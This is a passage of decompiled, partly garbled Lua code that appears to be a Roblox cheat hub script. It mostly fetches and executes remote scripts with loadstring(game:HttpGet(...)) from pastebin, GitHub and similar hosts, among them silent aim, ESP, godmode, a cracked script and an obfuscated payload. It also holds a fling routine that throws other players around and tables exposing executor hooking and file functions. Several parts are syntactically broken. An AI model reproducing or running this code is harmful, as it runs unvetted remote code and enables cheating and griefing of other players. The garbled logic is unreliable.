            pcall = pcall,
            xpcall = xpcall,
            unpack = unpack,
            getfenv = getfenv,
            setfenv = setfenv,
            collectgarbage = collectgarbage,
            gcinfo = gcinfo,
            newproxy = newproxy,
            require = require,
            load = load,
            loadstring = load,
            _VERSION = "Lua 5.1",
            string = string,
            table = table,
            math = math,
            bit32 = bit32,
            bit = bit32,
            os = os,
            io = io,
            utf8 = utf8,
            debug = debug,
            coroutine = coroutine,
            buffer = buffer,
            game = game,
            Game = game,
            workspace = workspace,
            Workspace = workspace,
            script = script,
            shared = shared,
            plugin = plugin,
            Instance = Instance,
            Vector2 = Vector2,
            Vector3 = Vector3,
            Vector2int16 = Vector2int16,
            Vector3int16 = Vector3int16,
            CFrame = CFrame,
            Color3 = Color3,
            UDim = UDim,
            UDim2 = UDim2,
            Rect = Rect,
            Region3 = Region3,
            Ray = Ray,
            NumberRange = NumberRange,
            NumberSequence = NumberSequence,
            NumberSequenceKeypoint = NumberSequenceKeypoint,
            ColorSequence = ColorSequence,
            ColorSequenceKeypoint = ColorSequenceKeypoint,
            BrickColor = BrickColor,
            TweenInfo = TweenInfo,
            PhysicalProperties = PhysicalProperties,
            Faces = Faces,
            Axes = Axes,
            Random = Random,
            DateTime = DateTime,
            Font = Font,
            OverlapParams = OverlapParams,
            RaycastParams = RaycastParams,
            Enum = Enum,
            wait = wait,
            tick = tick,
            time = time,
            elapsedTime = elapsedTime,
            typeof = typeof,
            warn = warn,
            spawn = spawn,
            delay = delay,
            task = task,
            getgenv = getgenv,
            getrenv = getrenv,
            getsenv = getsenv,
            getreg = getreg,
            getgc = getgc,
            getloadedmodules = getloadedmodules,
            getinstances = getinstances,
            getnilinstances = getnilinstances,
            getscripts = getscripts,
            getconnections = getconnections,
            getrunningscripts = getrunningscripts,
            getcallingscript = getcallingscript,
            gethui = gethui,
            getthreadidentity = getthreadidentity,
            setthreadidentity = setthreadidentity,
            checkcaller = checkcaller,
            islclosure = islclosure,
            iscclosure = iscclosure,
            isourclosure = isourclosure,
            is_synapse_function = is_synapse_function,
            clonefunction = clonefunction,
            cloneref = cloneref,
            compareinstances = compareinstances,
            newcclosure = newcclosure,
            hookfunction = hookfunction,
            replaceclosure = replaceclosure,
            hookmetamethod = hookmetamethod,
            getrawmetatable = getrawmetatable,
            setrawmetatable = setrawmetatable,
            setreadonly = setreadonly,
            isreadonly = isreadonly,
            make_writeable = make_writeable,
            make_readonly = make_readonly,
            identifyexecutor = identifyexecutor,
            getexecutorname = getexecutorname,
            setclipboard = setclipboard,
            toclipboard = toclipboard,
            setfpscap = setfpscap,
            firetouchinterest = firetouchinterest,
            fireclickdetector = fireclickdetector,
            fireproximityprompt = fireproximityprompt,
            keypress = keypress,
            keyrelease = keyrelease,
            mouse1click = mouse1click,
            mouse1press = mouse1press,
            mouse1release = mouse1release,
            mousemoverel = mousemoverel,
            queue_on_teleport = queue_on_teleport,
            saveinstance = saveinstance,
            decompile = decompile,
            getscriptclosure = getscriptclosure,
            getfunctionhash = getfunctionhash,
            getcustomasset = getcustomasset,
            rconsoleprint = rconsoleprint,
            rconsolename = rconsolename,
            rconsoleclear = rconsoleclear,
            setfflag = setfflag,
            protectgui = protectgui,
            unprotectgui = unprotectgui,
            sethiddenproperty = sethiddenproperty,
            gethiddenproperty = gethiddenproperty,
            isnetworkowner = isnetworkowner,
            isfile = isfile,
            isfolder = isfolder,
            makefolder = makefolder,
            delfile = delfile,
            delfolder = delfolder,
            listfiles = listfiles,
            readfile = readfile,
            writefile = writefile,
            appendfile = appendfile,
            loadfile = loadfile,
            dofile = dofile,
            request = request,
            http_request = request,
            crypt = crypt,
            base64_encode = base64_encode,
            base64_decode = base64_decode,
            base64encode = base64_encode,
            base64decode = base64_decode,
            syn = syn,
            WebSocket = WebSocket,
            Drawing = Drawing,
            DrawingImmediate = Drawing,
            }
            Element87._G = Element87
            local Element88 = Element87
            local Antivoid = Element87.Antivoid
            local Element89 = not Antivoid
            if Element89 then
                return Element89, Antivoid, Element88
            end
            Playergui(Antivoid, Element88)
            if HumanoidRootPart6.Position.Y <-100 then
                Element86(select(2, ...))
            end
        end
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local LocalPlayer13 = Players.LocalPlayer
        local Character10 = LocalPlayer13.Character
        if not Character10 then
            Character10 = LocalPlayer13.CharacterAdded
            HumanoidRootPart6 = Character10
            Character10 = Character10.Wait(HumanoidRootPart6)
        end
        ScreenGui = Character10
        HumanoidRootPart6 = Character10:WaitForChild("HumanoidRootPart")
        ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "ActivationMessageGUI"
        Playergui = "PlayerGui"
        Textlabel = LocalPlayer13
        ScreenGui.Parent = LocalPlayer13:WaitForChild("PlayerGui")
        Textlabel = "TextLabel"
        local TextLabel = Instance.new("TextLabel")
        Playergui = 0
        Element86 = 200
        TextLabel.Size = UDim2.new(0, 200, 0, 50)
        Playergui = 0.5
        Element86 =-100
        TextLabel.Position = UDim2.new(0.5,-100, 0.5,-25)
        Playergui = 0
        Element86 = 0
        TextLabel.BackgroundColor3 = Color3.new(0, 0, 0)
        Playergui = 1
        Element86 = 1
        TextLabel.TextColor3 = Color3.new(1, 1, 1)
        TextLabel.Text = "Activated"
        Playergui = Enum.Font
        TextLabel.Font = Playergui.SourceSansBold
        TextLabel.TextSize = 24
        TextLabel.Parent = ScreenGui
        Textlabel = delay
        Playergui = 2
        Element86 = Instance7
        delay(2, Instance7)
        Textlabel = {}
        Playergui = processItems3
        Element86 = updateState
        RunService.RenderStepped:Connect(RenderStepped)
        return Players, RunService, LocalPlayer13, Character10, HumanoidRootPart6, ScreenGui, TextLabel, Textlabel, Playergui, Element86
    end
    local Element90 = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Element90._G = Element90
    local Element91 = Element90
    Element90.Antivoid = Request13
    if Request13 then
        task.spawn(Job68)
        return Request13
    else
        return Request13, Element91
    end
end

local function Job69()
    loadstring(game:HttpGet("https://pastebin.com/raw/CjNsnSDy"))
end

local function Job70()
    loadstring(game:HttpGet("https://pastebin.com/raw/hCR5n6t4"))
end

local function Job71()
    loadstring(game:HttpGet("https://pastebin.com/raw/T0B1jtuj"))
end

local function Job72()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invincible-Godmode-46968"))
end

local function Job73()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/Generatenpc/refs/heads/main/Generatenpc.lua"))
end

local function Job74()
    loadstring(game:HttpGet("https://pastefy.app/YnfF3sje/raw"))
end

local function Job75()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/ESP/refs/heads/main/simude.lua"))
end

local function Job76()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ATLASTEAM01/SilentAim/refs/heads/main/Version/2.1.3.lua"))
end

local function Job77(kickReason)
    x9.KickReason = kickReason
    return kickReason, x9
end

local function Job78()
    local LocalPlayer14 = game.Players.LocalPlayer
    local Element92 = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Element92._G = Element92
    LocalPlayer14:Kick(Element92.KickReason or "æ²¡ç»é©¬å")
end

local function Job79()
    loadstring(game:HttpGet("https://pastefy.app/BkeffrT5/raw"))
end

local function Job80()
    loadstring(game:HttpGet("https://pastebin.com/raw/WPYkuNC5"))
end

local function Job81()
    loadstring(game:HttpGet("https://pastebin.com/raw/8ViVh8Xf"))
end

local function Job82()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/NPCButton/refs/heads/main/NPCUI"))
end

local function Job83()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/volkTeam/0cae3c206a59b59fd4fa32c665ee7481/raw/2d65f19f85a8e286a715b80871afd6fa9345bbff/Telekinesis%2520gui%2520volkteam.lua"))
end

local function Job84()
    loadstring(game:HttpGet("https://github.com/AZYsGithub/DexPlusPlus/releases/latest/download/out.lua"))
end

local function Job85()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))
end

local function Job86()
    loadstring(game:HttpGet("https://gitlab.com/upio/cobalt/-/releases/permalink/latest/downloads/Cobalt.luau"))
end

local function Job87()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))
end

local function Job88()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-EPIC-FE-AK47-5040"))
end

local function Job89()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IIIlll1ll1/Cracks/main/AdvancedLogic_Crack.lua"))
end

local function Job90()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-THE-REAL-dropkick-177199"))
end

local function Job91()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))
end

local Ffffff, Runservice4, Players
local function processItems6()
    local Character11, HumanoidRootPart7, Velocity
    if Players then
        Ffffff.Heartbeat:Wait()
        HumanoidRootPart7 = Runservice4
        while true do
            Character11 = HumanoidRootPart7.Character
            HumanoidRootPart7 = Character11 and Character11:FindFirstChild("HumanoidRootPart")
            if HumanoidRootPart7 then
                Velocity = HumanoidRootPart7.Velocity
                HumanoidRootPart7.Velocity = Velocity * 10000 + Vector3.new(0, 10000, 0)
                Ffffff.RenderStepped:Wait()
                HumanoidRootPart7.Velocity = Velocity
                Ffffff.Stepped:Wait()
                HumanoidRootPart7.Velocity = Velocity + Vector3.new(0, 0.1, 0)
                Character11 = Players
                if Character11 then
                    Ffffff.Heartbeat:Wait()
                    HumanoidRootPart7 = Runservice4
                    continue
                end
                return Character11, HumanoidRootPart7, Velocity
            end
            if Players then
                Ffffff.Heartbeat:Wait()
                HumanoidRootPart7 = Runservice4
                continue
            end
            break
        end
    end
end

local Element93
local function Job92(Request14)
    local function Job93(...)
        Element93()
        getgenv(select(2, ...)).flingRunning = false
    end
    Players = Request14
    local Element94 = Request14
    local Element95, Element96, Element97
    if Request14 then
        Element97 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element97._G = Element97
        Element96 = Element97
        getgenv(Element96.flingRunning, Element96).flingRunning = true
        Element95 = Job93
        coroutine.wrap(Element95)(Element95, Element96)
        local Element98 = {}
        Element96 = Element98
        Element98.Title = "ç©é£"
        Element96.Content = Request14 and "å·²å¼å¯" "å·²å³é­"
        Element96.Icon = Request14 and "play" "square"
        Element96.Duration = 2
        Element31:Notify(Element96)
        return Request14
    elseif Element94 then
        getgenv().flingRunning = true
        coroutine.wrap(Job93)()
        local Element99 = {}
        Element96 = Element99
        Element99.Title = "ç©é£"
        Element96.Content = Request14 and "å·²å¼å¯" "å·²å³é­"
        Element96.Icon = Request14 and "play" "square"
        Element96.Duration = 2
        Element31:Notify(Element96)
        return Request14
    else
        Element94 = Element31
        Element96 = {}
    end
    Element96.Title = "ç©é£"
    local Play = Request14
    if Request14 then
        Play = "å·²å¼å¯"
    end
    if not Play then
        Play = "å·²å³é­"
    end
    Element96.Content = Play
    Play = Request14
    if Request14 then
        Play = "play"
    end
    if not Play then
        Play = "square"
    end
    Element96.Icon = Play
    Element96.Duration = 2
    Element94:Notify(Element96)
    return Request14
end

local function Job94(Request15)
    local function Job95(...)
        local HttpService, Coregui
        local function Job96(Request16)
            local function Job97()
                local Element100 = HttpService:JSONDecode(game:HttpGet("https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=zh-CN&dt=t&q=" .. HttpService:UrlEncode(Request16)))
                local Element101 = Element100
                if Element100 then
                    Element101 = Element100[1]
                end
                if Element101 then
                    Element101 = Element100[1][1]
                end
                if Element101 then
                    Element101 = Element100[1][1][1]
                end
                if Element101 then
                    return Element100[1][1][1]
                else
                    return nil
                end
            end
            if not Request16 or Request16 == "" or #Request16 < 2 then
                return nil
            else
                local Ok, Element102 = pcall(Job97)
                if Ok and Element102 then
                    Coregui[Request16] = Element102
                    return Element102
                else
                    return nil
                end
            end
        end
        local function checkCondition(Request17)
            local Element103, Element104, Unpacked15, Unpacked16, Element105, Unpacked17, Element106, Pack12
            if not Request17 or Request17 == ""
            return false
        else
            Element103 = 0
            Element104 = 0
            Unpacked15 = Request17.gmatch
            Pack12 = table.pack(Unpacked15(Request17, "."))
            Unpacked15 = table.unpack(Pack12, 1, Pack12.Element103)
            Unpacked16 = table.unpack(Pack12, 2, Pack12.Element103)
            Unpacked17 = Unpacked15(Unpacked16, table.unpack(Pack12, 3, Pack12.Element103))
            if not (Unpacked17 == nil) then
                Element105 = Unpacked17
                while true do
                    Element106 = string.Element106(Unpacked17)
                    if Element106 then
                        Element104 = Element104 + 1
                        if 65 <= Element106 and Element106 <= 90 or 97 <= Element106 then
                            Element103 = Element103 + 1
                        end
                    end
                    Unpacked17 = Unpacked15(Unpacked16, Element105)
                    if Unpacked17 ~= nil then
                        Element105 = Unpacked17
                        continue
                    end
                    break
                end
            end
            if Element104 == 0 then
                return false
            else
                return 0.5 < Element103 / Element104
            end
        end
    end
    local Element107
    local function Flag2(Request18)
        local Text, Instance8
        if not (not Request18:IsA("TextLabel") and not Request18:IsA("TextButton") and not Request18:IsA("TextBox")) then
            Text = Request18.Text
            if not (not Text or Text == "") then
                Instance8 = Element107(Text)
                if Instance8 and Instance8 ~= Text then
                    Request18.Text = Instance8
                end
                return
            end
        end
    end
    local Element108
    local function processItems2(Request19)
        local Element109
        local function Job98()
            Element108(Element109)
        end
        Request19:GetDescendants()
        local Element110
        local Element111 = ipairs(Element110)
        local Pack13 = table.pack(Element111(Element110, 0))
        local Unpacked18 = table.unpack(Pack13, 1, Pack13.Element109)
        local Element112
        if not (Unpacked18 == nil) then
            Element112 = Unpacked18
            while true do
                task.spawn(Job98)
                Pack13 = table.pack(Element111(Element110, Element112))
                Unpacked18 = table.unpack(Pack13, 1, Pack13.Element109)
                if Unpacked18 ~= nil then
                    Element112 = Unpacked18
                    continue
                end
                break
            end
        end
        return Request19, Element111, Element110, Unpacked18, table.unpack(Pack13, 1, Pack13.Element109)
    end
    local function DescendantAdded(Request20)
        local function Job99()
            Element108(Request20)
        end
        local Element113 = x10
        local Translation = x10.Translation
        if Translation then
            task.delay(0.1, Job99)
            return Request20
        else
            return Request20, Translation, Element113
        end
    end
    local function Job100(Request21)
        local function Job101()
            Element108(Request21)
        end
        local Element114 = x10
        local Translation2 = x10.Translation
        if Translation2 then
            task.delay(0.1, Job101)
            return Request21
        else
            return Request21, Translation2, Element114
        end
    end
    local Players, Instance9
    local function Instance10()
        Players:GetChildren()
        local Element115
        local Element116 = ipairs(Element115)
        local Pack14 = table.pack(Element116(Element115, 0))
        local Unpacked19 = table.unpack(Pack14, 1, Pack14.Element116)
        local Element117
        if not (Unpacked19 == nil) then
            Element117 = Unpacked19
            while true do
                if Pack14[2]:IsA("ScreenGui") then
                    Instance9(table.unpack(Pack14, 2, Pack14.Element116))
                    Pack14 = table.pack(Element116(Element115, Element117))
                    Unpacked19 = table.unpack(Pack14, 1, Pack14.Element116)
                    if Unpacked19 == nil then
                        Element117 = Unpacked19
                    else
                        Element117 = Unpacked19
                        continue
                    end
                else
                    Pack14 = table.pack(Element116(Element115, Element117))
                    Unpacked19 = table.unpack(Pack14, 1, Pack14.Element116)
                    if Unpacked19 == nil then
                        break
                    else
                        Element117 = Unpacked19
                        continue
                    end
                end
                return Element116, Element115, Element117, table.unpack(Pack14, 1, Pack14.Element116)
            end
        end
        return Element116, Element115, Unpacked19, table.unpack(Pack14, 1, Pack14.Element116)
    end
    HttpService = game:GetService("HttpService")
    Players = "Players"
    local Players = game:GetService("Players")
    Players = game
    local RunService = game:GetService("RunService")
    Coregui = "CoreGui"
    Players = game:GetService("CoreGui")
    local LocalPlayer15 = Players.LocalPlayer
    Coregui = {}
    Element107 = Job96
    local Element118 = checkCondition
    Element108 = Flag2
    Instance9 = processItems2
    local PlayerGui = LocalPlayer15:WaitForChild("PlayerGui")
    PlayerGui.DescendantAdded:Connect(DescendantAdded)
    Players.DescendantAdded:Connect(Job100)
    local Element119
    if getgenv(select(3, ...)).Translation then
        Element119 = 1.5 / (getgenv(select(5, ...)).TranslationSpeed or 2)
        task.wait(Element119)
        while true do
            Instance9(PlayerGui)
            pcall(Instance10)
            Element119 = getgenv(select(2, ...)).Translation
            if Element119 then
                Element119 = 1.5 / (getgenv(select(4, ...)).TranslationSpeed or 2)
                task.wait(Element119)
                continue
            end
            break
        end
        return HttpService, Players, RunService, Players, LocalPlayer15, Coregui, Element107, Element118, Element108, Instance9, PlayerGui, Element119
    else
        return HttpService, Players, RunService, Players, LocalPlayer15, Coregui, Element107, Element118, Element108, Instance9, PlayerGui
    end
end

local Element120 = {
print = print,
type = type,
tostring = tostring,
tonumber = tonumber,
next = next,
pairs = pairs,
ipairs = ipairs,
select = select,
rawget = rawget,
rawset = rawset,
rawequal = rawequal,
rawlen = rawlen,
setmetatable = setmetatable,
getmetatable = getmetatable,
assert = assert,
error = error,
pcall = pcall,
xpcall = xpcall,
unpack = unpack,
getfenv = getfenv,
setfenv = setfenv,
collectgarbage = collectgarbage,
gcinfo = gcinfo,
newproxy = newproxy,
require = require,
load = load,
loadstring = load,
_VERSION = "Lua 5.1",
string = string,
table = table,
math = math,
bit32 = bit32,
bit = bit32,
os = os,
io = io,
utf8 = utf8,
debug = debug,
coroutine = coroutine,
buffer = buffer,
game = game,
Game = game,
workspace = workspace,
Workspace = workspace,
